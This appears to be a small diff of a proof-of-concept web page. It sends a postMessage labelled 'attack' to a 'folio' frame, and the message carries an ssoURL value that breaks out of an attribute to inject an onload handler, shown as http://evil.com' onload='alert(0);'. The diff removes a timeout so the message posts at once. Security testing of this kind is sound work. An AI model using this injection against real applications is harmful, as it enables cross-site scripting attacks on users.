@@ -40,6 +40,6 @@ title: Home
 <script>
  var message= {type:"message",data:{abc:"def",request:"attack",eventName:"folioActionLaunch",data:{ssoURL:"http://evil.com' onload='alert(0);'"}}};
  //var win = ;
- setTimeout(document.getElementById("folio").postMessage(message,"*"), 3000);
+ document.getElementById("folio").postMessage(message,"*");
 </script>
   
